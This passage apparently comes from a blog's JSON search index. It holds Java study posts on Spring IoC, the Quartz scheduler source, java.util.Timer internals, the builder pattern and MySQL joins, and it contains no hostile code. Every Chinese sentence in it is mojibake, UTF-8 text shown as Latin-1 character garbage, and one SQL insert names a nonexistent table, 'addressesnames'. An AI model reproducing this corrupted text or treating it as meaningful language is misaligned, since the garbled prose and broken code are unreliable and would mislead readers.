å‚æ•°ï¼Œæ¯ä¸ªå­—æ®µæœ‰getterå’Œsetterçš„javaç±»ã€‚POJOä¸ç”¨å®ç°å…¶ä»–æ¥å£ï¼Œä¹Ÿå°±æ˜¯ä¾µå…¥å¾ˆå°‘çš„ã€‚å¦‚æœæ˜¯xmlé…ç½®çš„ï¼Œå¯ä»¥ç›´æ¥å°†xmlå»é™¤æŠ•å…¥å…¶ä»–é¡¹ç›®ï¼Œå¹¶ä¸ä¼šå¯¼è‡´ç¨‹åºå‡ºç°å¤§çš„ç¼ºé™·ã€‚ä¾èµ–æ³¨å…¥ä»»ä½•ä¸€ä¸ªæœ‰å®é™…æ„ä¹‰çš„åº”ç”¨éƒ½ä¼šç”±ä¸¤ä¸ªæˆ–è€…å¤šä¸ªç±»ç»„æˆï¼Œè¿™äº›ç±»ä¹‹é—´è¿›è¡ŒååŠ©æ¥å®Œæˆç‰¹å®šçš„ä¸šåŠ¡é€»è¾‘ä¼ ç»Ÿåšæ³• ï¼šç›´æ¥newä¸€ä¸ªå¯¹è±¡ã€‚ç¼ºç‚¹ï¼šé«˜åº¦è€¦åˆï¼Œéš¾ä»¥æµ‹è¯•ä¾èµ–æ³¨å…¥ ï¼šå¯¹è±¡çš„ä¾èµ–å…³ç³»ç”±ç³»ç»Ÿä¸­è´Ÿè´£åè°ƒå„å¯¹è±¡çš„ç¬¬ä¸‰æ–¹ç»„ä»¶åœ¨åˆ›å»ºå¯¹è±¡çš„æ—¶å€™è¿›è¡Œè®¾å®šï¼Œå¯¹è±¡æ— éœ€è‡ªè¡Œåˆ›å»ºæˆ–ç®¡ç†å®ƒä»¬çš„ä¾èµ–å…³ç³»ã€‚springæ˜¯é€šè¿‡åº”ç”¨ä¸Šä¸‹æ–‡å°†beanå®šä¹‰ï¼Œå¹¶æŠŠè¿™äº›beanç»„è£…èµ·æ¥ã€‚ä¼˜ç‚¹ï¼šæ¾è€¦åˆï¼Œæ˜“æµ‹è¯•ã€‚å…·ä½“æµ‹è¯•ï¼Œè¿™ä¸ªåœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨mockito-coreè¿™ä¸ªåŒ…ç­‰ç­‰ï¼Œåªæ˜¯ä¸¾ä¸ªæ —å­ã€‚ å¥½äº†ï¼Œä¸‹é¢å…³äºaopä¹‹ç±»çš„ä¿¡æ¯ï¼Œå†éšåçš„æ—¥å­é‡Œä¼šè¿›è¡Œä»‹ç»ï¼Œä»Šå¤©å°±ä»‹ç»ä¸€ä¸‹iocçš„å¤§æ¦‚æ„æ€","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"}]},{"title":"quartzæºç é˜…è¯»ï¼ˆä¸€ï¼‰ï¼Œå…ˆå¼€å‘","slug":"quartzæºç é˜…è¯»ï¼ˆä¸€ï¼‰ï¼Œå…ˆå¼€å‘","date":"2018-10-10T12:07:27.000Z","updated":"2020-11-14T17:11:13.127Z","comments":true,"path":"2018/10/10/quartzæºç é˜…è¯»ï¼ˆä¸€ï¼‰ï¼Œå…ˆå¼€å‘/","link":"","permalink":"http://yoursite.com/2018/10/10/quartz%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%8C%E5%85%88%E5%BC%80%E5%9D%91/","excerpt":"","text":"é¦–å…ˆï¼Œæˆ‘ä½¿ç”¨çš„quartzçš„ç‰ˆæœ¬ &lt;dependency&gt; &lt;groupId&gt;org.quartz-scheduler&lt;/groupId&gt; &lt;artifactId&gt;quartz&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt; &lt;/dependency&gt;é¦–å…ˆï¼Œmainå‡½æ•° public static void main(String[] args) throws SchedulerException { //1.åˆ›å»ºschedulerFactoryçš„å·¥å‚ SchedulerFactory schedulerFactory = new StdSchedulerFactory(); //2.ä»å·¥å‚ä¸­è·å–è°ƒåº¦å™¨å®ä¾‹ Scheduler scheduler = schedulerFactory.getScheduler(); //åˆ›å»ºJobDetail JobDetail jobDetail = JobBuilder.newJob(RAMJob.class) .withDescription(&quot;this is a ram job&quot;) .withIdentity(&quot;ramjob&quot;,&quot;ramGroup&quot;) .build(); //ä»»åŠ¡è¿è¡Œçš„æ—¶é—´ï¼ŒsimpleSchedleç±»å‹è§¦å‘å™¨æœ‰æ•ˆ long time = System.currentTimeMillis() + 3 * 1000L; Date startTime = new Date(time); //åˆ›å»ºTrigger //ä½¿ç”¨SimpleScheduleBuilderæˆ–è€…CronSchedulerBuilder Trigger trigger = TriggerBuilder.newTrigger() .withDescription(&quot;è§¦å‘å™¨&quot;) .withIdentity(&quot;ramTrigger&quot;,&quot;ramTriggerGroup&quot;) .startAt(startTime) .withSchedule(CronScheduleBuilder.cronSchedule(&quot;0/2 * * * * ?&quot;)) .build(); //æ³¨å†Œä»»åŠ¡å’Œå®šæ—¶å™¨ scheduler.scheduleJob(jobDetail,trigger); //å¯åŠ¨è°ƒåº¦å™¨ scheduler.start(); log.info(&quot;å¯åŠ¨æ—¶é—´ï¼š&quot;+sdf.format(new Date())); } SchedulerFactory schedulerFactory = new StdSchedulerFactory(); åˆ›å»ºä½œä¸šè°ƒåº¦çš„å·¥å‚ç±»ï¼š é¦–å…ˆçœ‹StdSchedulerFactory constantsï¼šå˜é‡ å¤ªå¤šäº†ï¼Œç­‰ä¼šç”¨åˆ°å†æ¥çœ‹ constructorsï¼šæ„é€ æ–¹æ³• /** ç”Ÿæˆä¸€ä¸ªæ²¡æœ‰æœªåˆå§‹åŒ–çš„StdSchedulerFactory */ public StdSchedulerFactory() /** ä¸‹é¢è¿™ä¸¤ä¸ªï¼Œå…¶å®æ˜¯ä¸€ä¸ªç›´æ¥çš„Propertiesç±»å‹çš„ï¼Œå¦ä¸€ä¸ªæ˜¯è¿™ä¸ªpropertiesçš„fileNameï¼Œ å…¶å®å°±æ˜¯é€šè¿‡InputStreamè§£æè¿™ä¸ªæ–‡ä»¶å°†å°è£…ä¸€ä¸ªå‡ºpropertiesï¼Œæœ€åè¿˜æ˜¯é€šè¿‡ initialize(props); ç»™å˜é‡ï¼šprivate PropertiesParser cfgï¼›èµ‹å€¼ this.cfg = new PropertiesParser(props); */ public StdSchedulerFactory(Properties props) throws SchedulerException { initialize(props); } public StdSchedulerFactory(String fileName) throws SchedulerException { initialize(fileName); } //2.ä»å·¥å‚ä¸­è·å–è°ƒåº¦å™¨å®ä¾‹ Scheduler scheduler = schedulerFactory.getScheduler(); public Scheduler getScheduler() throws SchedulerException { if (cfg == null) { initialize();//æ­¤æ¬¡ä¼šå»è§£ææ˜¯å¦æœ‰quartz.protertiesæ–‡ä»¶ï¼Œå¦‚æœæœ‰åˆ™ç”¨ä½ çš„ï¼Œå¦‚æœæ²¡æœ‰ï¼Œé‚£å°±ä¼šç”¨ä»–jaråŒ…ä¸­çš„ åœ¨org/quartz/quartz.properties /** By default a properties file named &quot;quartz.properties&quot; is loaded from * the &apos;current working directory&apos;. If that fails, then the * &quot;quartz.properties&quot; file located (as a resource) in the org/quartz * package is loaded. If you wish to use a file other than these defaults, * you must define the system property &apos;org.quartz.properties&apos; to point to * the file you want. */ //quartz.propertiesä¸­å¤§è‡´æ¶‰åŠï¼šçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ•°ï¼Œçº¿ç¨‹ä¼˜å…ˆçº§ï¼Œå…·ä½“å¯ä»¥çœ‹ // https://www.jianshu.com/p/14f86c6efe22 } SchedulerRepository schedRep = SchedulerRepository.getInstance(); Scheduler sched = schedRep.lookup(getSchedulerName()); if (sched != null) { if (sched.isShutdown()) { schedRep.remove(getSchedulerName()); } else { return sched; } } sched = instantiate(); return sched; } //ä¼šç”Ÿæˆä¸€ä¸ªScheduleræ¥å£å®ç°çš„çš„StdScheduler åœ¨StdSchedulerä¸­æœ‰ä¸ªå˜é‡ï¼š private QuartzScheduler sched; This is the heart of Quartz, an indirect implementation of the &lt;code&gt;{@link org.quartz.Scheduler}&lt;/code&gt; quartzçš„ä¸­å¿ƒï¼Œé—´æ¥çš„å®ç°äº†Scheduleræ¥å£ StdScheduleré‡Œé¢çš„è°ƒç”¨æ–¹æ³•ï¼Œéƒ½æ˜¯ä½¿ç”¨QuartzScheduleré‡Œé¢çš„æ–¹æ³• åˆ’é‡ç‚¹QuartzSchedulerè¿™ä¸ªç±»ï¼Œæœ‰ç‚¹å¤æ‚ï¼Œåé¢å†è®² ä¸‹é¢çœ‹JobDetail å…³äºJobdetailå’ŒTriggerçš„ä»‹ç» /** Quartz does not store an actual instance of a &lt;code&gt;Job&lt;/code&gt; class, but * instead allows you to define an instance of one, through the use of a &lt;code&gt;JobDetail&lt;/code&gt;. quartzä¸­ä¸ä¿å­˜ä¸€ä¸ªçœŸå®çš„jobç±»ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡jobdetailæ¥å®šä¹‰ä¸€ä¸ªå®ä¾‹ * &lt;code&gt;Job&lt;/code&gt;s have a name and group associated with them, which * should uniquely identify them within a single &lt;code&gt;{@link Scheduler}&lt;/code&gt;. jobéœ€è¦ä¸€ä¸ªnameå’Œgroupæ¥å…³è”ä»–ä»¬ï¼Œ &lt;code&gt;Trigger&lt;/code&gt;s are the &apos;mechanism&apos; by which &lt;code&gt;Job&lt;/code&gt;s * are scheduled. Many &lt;code&gt;Trigger&lt;/code&gt;s can point to the same &lt;code&gt;Job&lt;/code&gt;, * but a single &lt;code&gt;Trigger&lt;/code&gt; can only point to one &lt;code&gt;Job&lt;/code&gt;. è§¦å‘å™¨æ˜¯jobsçš„è°ƒåº¦çš„æœºåˆ¶ã€‚ä¸€ä¸ªjobå¯ä»¥å¯¹åº”å¤šä¸ªTriggerï¼Œä½†æ˜¯triggeråªå¯ä»¥å¯¹åº”ä¸€ä¸ªjob *///åˆ›å»ºJobDetail JobDetail jobDetail = JobBuilder.newJob(RAMJob.class) .withDescription(&quot;this is a ram job&quot;) .withIdentity(&quot;ramjob&quot;,&quot;ramGroup&quot;) .build(); ä½¿ç”¨æ„é€ å™¨æ¨¡å¼ï¼š æ–°å»ºä¸€ä¸ªJobDetailImpl//åˆ›å»ºTrigger //ä½¿ç”¨SimpleScheduleBuilderæˆ–è€…CronSchedulerBuilder Trigger trigger = TriggerBuilder.newTrigger() .withDescription(&quot;è§¦å‘å™¨&quot;) .withIdentity(&quot;ramTrigger&quot;,&quot;ramTriggerGroup&quot;) .startAt(startTime) .withSchedule(CronScheduleBuilder.cronSchedule(&quot;0/2 * * * * ?&quot;)) .build(); å…¶ä¸­åœ¨TriggerBuilderä¸­çš„withSchedule()æ–¹æ³• /** * Set the {@link ScheduleBuilder} that will be used to define the * Trigger&apos;s schedule. * * &lt;p&gt;The particular &lt;code&gt;SchedulerBuilder&lt;/code&gt; used will dictate * the concrete type of Trigger that is produced by the TriggerBuilder.&lt;/p&gt; * @param schedBuilder the SchedulerBuilder to use. * @return the updated TriggerBuilder * @see ScheduleBuilder * @see SimpleScheduleBuilder * @see CronScheduleBuilder * @see CalendarIntervalScheduleBuilder * æ˜¯æ ¹æ®é‡Œé¢ï¼Œæ¥ç¡®å®šTriggeræ¥å£å®ç°ç±»çš„ç±»å‹ å…¶ä¸­ï¼Œè¿™ä¸ªcroné‡Œé¢çš„è§£æ&quot;0/2 * * * * ?&quot;ï¼šæ˜¯é€šè¿‡CronExpression.javaä¸­çš„buildExpressionæ–¹æ³•æ¥è§£æçš„ åœ¨CronTriggerImplä¸­ä¼š @Deprecated public CronTriggerImpl(String name, String group, String cronExpression) throws ParseException { super(name, group);//nameå’Œgroup setCronExpression(cronExpression);//è§£æcronå­—ç¬¦ä¸² setStartTime(new Date());//å½“å‰æ—¶é—´ setTimeZone(TimeZone.getDefault());//å½“å‰æ—¶åŒº }//æ³¨å†Œä»»åŠ¡å’Œå®šæ—¶å™¨ scheduler.scheduleJob(jobDetail,trigger); å…¶å®æ˜¯è°ƒç”¨çš„æ˜¯QuartzSchedulerä¸­çš„ public Date scheduleJob(JobDetail jobDetail, Trigger trigger) throws SchedulerExceptionæ–¹æ³• resources.getJobStore().storeJobAndTrigger(jobDetail, trig);//å­˜å‚¨job and triggeråˆ°jobStore notifySchedulerListenersJobAdded(jobDetail);//æ·»åŠ jobDetailåˆ°è°ƒåº¦ç›‘å¬å™¨ notifySchedulerThread(trigger.getNextFireTime().getTime());//é€šçŸ¥è°ƒåº¦å™¨ä¸‹ä¸€åˆ»è°ƒåº¦æ—¶é—´ notifySchedulerListenersSchduled(trigger);//æ·»åŠ triggeråˆ°è°ƒåº¦ç›‘å¬å™¨//å¯åŠ¨è°ƒåº¦å™¨ scheduler.start(); public void start() throws SchedulerException { if (shuttingDown|| closed) { throw new SchedulerException( &quot;The Scheduler cannot be restarted after shutdown() has been called.&quot;); } // QTZ-212 : calling new schedulerStarting() method on the listeners // right after entering start() notifySchedulerListenersStarting();//é€šçŸ¥è°ƒåº¦ç›‘å¬å™¨æ­£åœ¨å¯åŠ¨ if (initialStart == null) { initialStart = new Date(); this.resources.getJobStore().schedulerStarted(); // startPlugins(); } else { resources.getJobStore().schedulerResumed(); } schedThread.togglePause(false); getLog().info( &quot;Scheduler &quot; + resources.getUniqueIdentifier() + &quot; started.&quot;); notifySchedulerListenersStarted();//é€šçŸ¥è°ƒåº¦ç›‘å¬å™¨å·²ç»å¯åŠ¨ }start()è¿™ä¸ªæ–¹æ³•æ˜å¤©å†çœ‹ï¼Œå›å»çœ‹QGhappy vs BAé»‘å‡¤æ¢¨2018.10.10å–èŒæ—¥","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"}]},{"title":"Timerå®šæ—¶è°ƒç”¨","slug":"Timerå®šæ—¶è°ƒç”¨","date":"2018-09-18T09:32:30.000Z","updated":"2020-11-14T17:11:13.715Z","comments":true,"path":"2018/09/18/Timerå®šæ—¶è°ƒç”¨/","link":"","permalink":"http://yoursite.com/2018/09/18/Timer%E5%AE%9A%E6%97%B6%E8%B0%83%E7%94%A8/","excerpt":"","text":"1. å…·ä½“å®ä¾‹ç»§æ‰¿TimerTaskæŠ½è±¡ç±» å®ç°ä¸¤ä¸ªå­ç±»TimerJobå’ŒTimerJob2 package com.husky.timer; import java.text.SimpleDateFormat; import java.util.Date; import java.util.TimerTask; /** * @author husky * @date 2018/9/17 9:41 */ public class TimerJob extends TimerTask { @Override public void run() { System.out.println(&quot;å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob&quot;); Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); System.out.println(&quot;Current time : &quot;+sf.format(date)); System.out.println(&quot;å½“å‰çº¿ç¨‹ï¼š &quot;+Thread.currentThread().getName()); } } package com.husky.timer; import java.text.SimpleDateFormat; import java.util.Date; import java.util.TimerTask; /** * @author husky * @date 2018/9/17 10:40 */ public class TimerJob2 extends TimerTask { @Override public void run() { System.out.println(&quot;å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob2&quot;); Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); System.out.println(&quot;Current time : &quot;+sf.format(date)); System.out.println(&quot;å½“å‰çº¿ç¨‹ï¼š &quot;+Thread.currentThread().getName()); } }æµ‹è¯•ç±» public class TimerRun { public static void main(String[] args) { Date date = new Date(); SimpleDateFormat sf = new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;); System.out.println(&quot;Current time:&quot;+sf.format(date)); System.out.println(Thread.currentThread().getName()); System.out.println(&quot;å¼€å§‹æ‰§è¡Œå®šæ—¶ä»»åŠ¡=======&quot;); Timer timer = new Timer(); TimerJob timerJob = new TimerJob(); TimerJob2 timerJob2 = new TimerJob2(); timer.schedule(timerJob,3000,2000); timer.schedule(timerJob2,5000,3000); } } /** è¿è¡Œç»“æœï¼š Current time:2018-09-18 16:11:08 main å¼€å§‹æ‰§è¡Œå®šæ—¶ä»»åŠ¡======= å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob Current time : 2018-09-18 16:11:11 å½“å‰çº¿ç¨‹ï¼š Timer-0 å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob Current time : 2018-09-18 16:11:13 å½“å‰çº¿ç¨‹ï¼š Timer-0 å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob2 Current time : 2018-09-18 16:11:13 å½“å‰çº¿ç¨‹ï¼š Timer-0 å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob Current time : 2018-09-18 16:11:15 å½“å‰çº¿ç¨‹ï¼š Timer-0 å½“å‰æ‰§è¡Œçš„ä»»åŠ¡æ˜¯TimerJob2 Current time : 2018-09-18 16:11:16 å½“å‰çº¿ç¨‹ï¼š Timer-0 */å…·ä½“æºç åˆ†æï¼šé¦–å…ˆåˆ†æTimerï¼š æˆå‘˜å˜é‡ private final TaskQueue queue = new TaskQueue(); //è¯¥å¯¹è±¡æ˜¯å°è£…äº†TimerTaskçš„æ•°ç»„ï¼Œå®ç°ç±»ä¼¼äºlist /**class TaskQueue { private TimerTask[] queue = new TimerTask[128]; private int size = 0; è¯¥å¯¹è±¡ä¹Ÿå¯ä»¥é€šè¿‡ä»–çš„addæ–¹æ³•ï¼Œè¿›è¡Œæ•°ç»„æ‰©å®¹ */ private final TimerThread thread = new TimerThread(queue); //è¿™ä¸ªçº¿ç¨‹æ˜¯ç­‰å¾…timerqueueä¸Šçš„taskï¼Œæ‰§è¡Œä¸€æ¬¡ä»»åŠ¡ï¼Œé‡å¤æ‰§è¡Œä»»åŠ¡ï¼Œä»¥åŠç§»é™¤ä¸€äº›ä»»åŠ¡ //è¿™ä¸ªç±»å¾ˆé‡è¦ï¼Œç­‰ä¼šå…·ä½“åˆ†æ æ„é€ å‡½æ•° public Timer() { this(&quot;Timer-&quot; + serialNumber()); } public Timer(boolean isDaemon) { this(&quot;Timer-&quot; + serialNumber(), isDaemon); } public Timer(String name) { thread.setName(name); thread.start(); } public Timer(String name, boolean isDaemon) { thread.setName(name); thread.setDaemon(isDaemon); thread.start();//ä»è¿™å„¿å¯ä»¥çœ‹å‡ºï¼Œå¯åŠ¨äº†TimerThreadçº¿ç¨‹ } é‡è¦æ–¹æ³• public void schedule(TimerTask task, long delay, long period) { if (delay &lt; 0) throw new IllegalArgumentException(&quot;Negative delay.&quot;); if (period &lt;= 0) throw new IllegalArgumentException(&quot;Non-positive period.&quot;); sched(task, System.currentTimeMillis()+delay, -period); } //æ­¤å¤„å°†delayåŠ ä¸Šå½“å‰æ—¶é—´ï¼Œè·å–æ‰§è¡Œæ—¶é—´ private void sched(TimerTask task, long time, long period) { if (time &lt; 0) throw new IllegalArgumentException(&quot;Illegal execution time.&quot;); // Constrain value of period sufficiently to prevent numeric // overflow while still being effectively infinitely large. if (Math.abs(period) &gt; (Long.MAX_VALUE &gt;&gt; 1)) period &gt;&gt;= 1; synchronized(queue) { if (!thread.newTasksMayBeScheduled) throw new IllegalStateException(&quot;Timer already cancelled.&quot;); synchronized(task.lock) { if (task.state != TimerTask.VIRGIN) throw new IllegalStateException( &quot;Task already scheduled or cancelled&quot;); task.nextExecutionTime = time; task.period = period; task.state = TimerTask.SCHEDULED; } queue.add(task);//å°†TimerTaskçš„å­ç±»æ”¾å…¥åˆ°TimerQueueä¸­ if (queue.getMin() == task) queue.notify(); } }å¥½äº†ï¼Œä¸Šé¢å®ç°äº†æ·»åŠ ä»»åŠ¡ï¼Œä¸‹é¢å°±æ˜¯æ‰§è¡Œäº†ï¼Œæˆ‘ä»¬æ¥åˆ†æTimerThread å¤§è‡´ class TimerThread extends Thread { boolean newTasksMayBeScheduled = true; private TaskQueue queue; TimerThread(TaskQueue queue) { this.queue = queue; } public void run() { try { mainLoop(); } finally { // Someone killed this Thread, behave as if Timer cancelled //æ„å¤–æ€æ­»äº†çº¿ç¨‹ï¼Œè¡¨ç°çš„åƒTimeræ³¨é”€ synchronized(queue) { newTasksMayBeScheduled = false; queue.clear(); // Eliminate obsolete references } } } å…·ä½“åˆ†æmainLoopæ–¹æ³• private void mainLoop() { while (true) { try { TimerTask task; boolean taskFired; synchronized(queue) { // Wait for queue to become non-empty while (queue.isEmpty() &amp;&amp; newTasksMayBeScheduled) queue.wait(); if (queue.isEmpty()) break; // Queue is empty and will forever remain; die //å¦‚æœä¸€ç›´æ²¡æœ‰taskè¿›å…¥æ•°ç»„ï¼Œdie // Queue nonempty; look at first evt and do the right thing long currentTime, executionTime; task = queue.getMin(); //è·å–TimerQueueä¸­æœ€å‰çš„taskï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œæ—¶é—´æœ€è¿‘çš„ synchronized(task.lock) { if (task.state == TimerTask.CANCELLED) { queue.removeMin(); continue; // No action required, poll queue again } currentTime = System.currentTimeMillis(); executionTime = task.nextExecutionTime; if (taskFired = (executionTime&lt;=currentTime)) { if (task.period == 0) { // Non-repeating, remove//åˆ¤æ–­æ˜¯å¦è¦é‡å¤æ‰§è¡Œï¼Œä¸éœ€è¦ç›´æ¥remove queue.removeMin(); task.state = TimerTask.EXECUTED;//æ›´æ”¹taskçŠ¶æ€ } else { // Repeating task, reschedule queue.rescheduleMin( task.period&lt;0 ? currentTime - task.period : executionTime + task.period);//æ›´æ”¹é‡å¤æ‰§è¡Œçš„taskçš„ä¸‹ä¸€æ¬¡çš„è¿è¡Œæ—¶é—´ } } } if (!taskFired) // Task hasn&apos;t yet fired; wait//å¦‚æœè¿˜æ²¡åˆ°æ‰§è¡Œæ—¶é—´ï¼Œç­‰å¾… queue.wait(executionTime - currentTime); } if (taskFired) // Task fired; run it, holding no locks task.run();//taskè¿è¡Œ //ï¼Œè¿™è¾¹ä½¿ç”¨çš„æ˜¯runï¼ˆï¼‰è€Œä¸æ˜¯startï¼ˆï¼‰ï¼Œä¹Ÿå°±æ˜¯è¯´runæ–¹æ³•æ˜¯ç®€å•çš„æ–¹æ³•ï¼Œè¦æŒ‰ç…§é¡ºåºæ‰§è¡Œï¼Œè€Œä¸æ˜¯çº¿ç¨‹çš„runæ–¹æ³•,åœ¨è¿™ä¸ªåœ°æ–¹å¹¶æ²¡æœ‰å¯¹runæ–¹æ³•è¿›è¡Œtry/catch } catch(InterruptedException e) { } } }ç¼ºé™·åˆ†æTimeræ˜¯å•çº¿ç¨‹æ¡ˆä¾‹ï¼šæœ‰ä¸¤ä¸ªé‡å¤ä»»åŠ¡ï¼ˆrepeat taskï¼‰ï¼Œtask1æ­£å¸¸ä»»åŠ¡ï¼Œtask2ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œç¬¬ä¸€ä¸ªæ˜¯å…ˆæ‰§è¡Œçš„ï¼Œè€Œç¬¬äºŒä¸ªåæ‰§è¡Œçš„ï¼Œå¦‚æœæ­£å¸¸æ‰§è¡Œï¼Œæ‰§è¡Œçš„é¡ºåºtask1 ï¼Œtask1 ï¼Œtask2ï¼Œtask1 ï¼Œtask1ï¼Œã€‚ã€‚ã€‚,å½“æ‰§è¡Œåˆ°task2æ—¶ï¼ŒæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œæˆ‘ä»¬åœ¨è¿è¡Œçš„æ—¶å€™ï¼Œåœ¨TimerThreadçš„mainLoopä¸­çš„task.runï¼ˆï¼‰ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰è¿›è¡Œtrycatchï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€æ—¦å‡ºç°å¼‚å¸¸ï¼Œæˆ‘ä»¬æ²¡æœ‰æ•è·ï¼Œtimer-0è¿™ä¸ªçº¿ç¨‹å°±ä¼šç»ˆæ­¢ï¼Œè€Œtimeræœ‰æ—¶å•çº¿ç¨‹ï¼Œä¹Ÿå°±æ˜¯ä¼šå‡ºç°ç¨‹åºå¼‚å¸¸ç»ˆæ­¢ã€‚ å› ä¸ºï¼Œè‡ªå·±çš„åº•å­ä¸€èˆ¬èˆ¬ï¼Œåšæ–‡ä¸­çš„ä¸€äº›æœ¯è¯­å¯èƒ½ä½¿ç”¨é”™è¯¯ï¼Œæˆ–è€…æœ‰å­—æ‰“é”™ï¼Œæœ›æŒ‡æ­£ã€‚","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"Timer","slug":"Timer","permalink":"http://yoursite.com/tags/Timer/"},{"name":"å®šæ—¶ä»»åŠ¡","slug":"å®šæ—¶ä»»åŠ¡","permalink":"http://yoursite.com/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"}]},{"title":"æ„é€ å™¨æ¨¡å¼","slug":"æ„é€ å™¨æ¨¡å¼","date":"2018-09-12T12:21:13.000Z","updated":"2020-11-14T17:11:14.193Z","comments":true,"path":"2018/09/12/æ„é€ å™¨æ¨¡å¼/","link":"","permalink":"http://yoursite.com/2018/09/12/%E6%9E%84%E9%80%A0%E5%99%A8%E6%A8%A1%E5%BC%8F/","excerpt":"","text":"å¹³å¸¸æˆ‘ä»¬æ–°å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œä¸€èˆ¬æ˜¯ç›´æ¥ Student student = new Student(&quot;zhangsan&quot;,11,new Date(),&quot;ç”·&quot;);è¿™æ ·çš„ä»£ç å¯è¯»æ€§æå·®ã€‚ ä½¿ç”¨æ„é€ å™¨æ¨¡å¼ Student student = new Student .StudentBuilder(&quot;å¼ ä¸‰&quot;) .date(new Date()) .address(&quot;æ±Ÿè‹&quot;) .gender(&quot;ç”·&quot;) .build();è¿™æ ·è®©äººå¯ä»¥åœ¨çœ‹ä»£ç çš„æ—¶å€™ï¼Œä¸€ç›®äº†ç„¶ä¸‹é¢æ˜¯å…·ä½“ä»£ç å®ç°ï¼šï¼ˆå¾ˆç®€å•çš„å•¦ï¼‰ package com.husky.pojo; import java.util.Date; /** * @author husky * @date 2018/9/12 19:47 */ public class Student { private String name; private Date date; private String address; private String gender; public Student() { super(); } public Student(StudentBuilder studentBuilder) { this.name = studentBuilder.name; this.date = studentBuilder.date; this.address = studentBuilder.address; this.gender = studentBuilder.gender; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Date getDate() { return date; } public void setDate(Date date) { this.date = date; } public String getAddress() { return address; } public void setAddress(String address) { this.address = address; } public String getGender() { return gender; } public void setGender(String gender) { this.gender = gender; } @Override public String toString() { return &quot;Student{&quot; + &quot;name=&apos;&quot; + name + &apos;\\&apos;&apos; + &quot;, date=&quot; + date + &quot;, address=&apos;&quot; + address + &apos;\\&apos;&apos; + &quot;, gender=&apos;&quot; + gender + &apos;\\&apos;&apos; + &apos;}&apos;; } public static class StudentBuilder { private String name; private Date date; private String address; private String gender; public String getName() { return name; } public Date getDate() { return date; } public String getAddress() { return address; } public String getGender() { return gender; } public StudentBuilder(String name){ this.name = name; } public StudentBuilder date(Date date){ this.date = date; return this; } public StudentBuilder address(String address){ this.address = address; return this; } public StudentBuilder gender(String gender){ this.gender = gender; return this; } public Student build(){ return new Student(this); } } }æµ‹è¯• Student student = new Student .StudentBuilder(&quot;å¼ ä¸‰&quot;) .date(new Date()) .address(&quot;æ±Ÿè‹&quot;) .gender(&quot;ç”·&quot;) .build(); System.out.println(student);è¿™ç§å†™æ³•æœ‰ç‚¹åƒjdk8çš„æµå¼å†™æ³•ï¼Œä½†æ˜¯ç¼ºç‚¹å´æ˜¯å¾ˆæ˜¾ç„¶ï¼Œè‡ªå·±å†™builderçš„æ—¶å€™ååˆ†çƒ¦èºï¼Œä»£ç å†—ä½™","categories":[],"tags":[{"name":"Javaå­¦ä¹ ","slug":"Javaå­¦ä¹ ","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"æ„é€ å™¨æ¨¡å¼","slug":"æ„é€ å™¨æ¨¡å¼","permalink":"http://yoursite.com/tags/%E6%9E%84%E9%80%A0%E5%99%A8%E6%A8%A1%E5%BC%8F/"}]},{"title":"mysqlä¸­joinçš„è¿æ¥æ–¹å¼","slug":"mysqlä¸­joinçš„è¿æ¥æ–¹å¼","date":"2018-08-18T12:34:01.000Z","updated":"2020-11-14T17:11:15.686Z","comments":true,"path":"2018/08/18/mysqlä¸­joinçš„è¿æ¥æ–¹å¼/","link":"","permalink":"http://yoursite.com/2018/08/18/mysql%E4%B8%ADjoin%E7%9A%84%E8%BF%9E%E6%8E%A5%E6%96%B9%E5%BC%8F/","excerpt":"","text":"åœ¨sqlä¸­æœ‰4ä¸­æ–¹å¼INNER JOIN(JOIN)LEFT JOINRIGHT JOINFULL OUTER JOIN(mysqlä¸­ä¸æ”¯æŒ) é¦–å…ˆå»ºè¡¨ è¿™äº›ä¸œè¥¿è¿˜æ˜¯è‡ªå·±æä¸€éæ¯”è¾ƒå¥½ä¸‹é¢æ˜¯å»ºè¡¨è¯­å¥ create table names( id int primary key auto_increment, name varchar(20) not null ); create table addresses( id int primary key auto_increment, address varchar(20) not null ); insert into names values(1,&apos;Google&apos;); insert into names values(2,&apos;Taobao&apos;); insert into names values(3,&apos;Weibo&apos;); insert into names values(4,&apos;Facebook&apos;); insert into addresses values(1,&apos;USA&apos;); insert into addresses values(5,&apos;CHINA&apos;); insert into addresses values(3,&apos;CHINA&apos;); insert into addressesnames values(6,&apos;USA&apos;); INNER JOINå†…è¿æ¥æ˜¯æœ€å¸¸è§çš„ä¸€ç§è¿æ¥ï¼Œåªè¿æ¥åŒ¹é…çš„è¡Œinner 